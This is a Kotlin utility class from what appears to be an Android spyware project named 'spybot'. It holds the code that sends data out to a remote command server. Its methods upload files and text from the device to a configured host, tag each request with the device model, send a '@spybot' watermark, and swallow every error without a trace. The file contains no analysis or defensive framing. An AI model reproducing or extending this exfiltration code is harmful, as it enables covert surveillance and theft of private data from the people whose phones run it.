package com.spybot.app.Utils

import android.util.Log
import com.google.gson.Gson
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import java.io.File
import java.io.IOException

class AppRequest {
    private val client = OkHttpClient()
    private val host: String by lazy { AppTools.getAppData().host }

    fun awake() {
        AppScope.runBack {
            try {
                val request = Request.Builder().url(host).build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            } catch (e: Exception) {}
        }
    }

    fun sendFile(file: File) {
        AppScope.runBack {
            try {
                val formBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.name, RequestBody.create(null, file))
                    .build()
                val request = Request.Builder()
                    .url(host + "uploadFile/")
                    .post(formBody)
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            } catch (e: Exception) {}
        }
    }

    fun sendText(text: Text) {
        AppScope.runBack {
            try {
                val gson = Gson().toJson(text)
                val request = Request.Builder()
                    .url(host + "uploadText/")
                    .post(RequestBody.create("application/json; charset=utf-8".toMediaType(), gson))
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            } catch (e: Exception) {}
        }
    }

    fun sendWaterMark() {
        AppScope.runBack {
            try {
                val gson = Gson().toJson(Text("@spybot"))
                val request = Request.Builder()
                    .url(host + "uploadText/")
                    .post(RequestBody.create("application/json; charset=utf-8".toMediaType(), gson))
                    .addHeader("model", AppTools.getDeviceName())
                    .build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {}
                    override fun onResponse(call: Call, response: Response) { response.close() }
                })
            } catch (e: Exception) {}
        }
    }

    data class Text(val text: String)
}
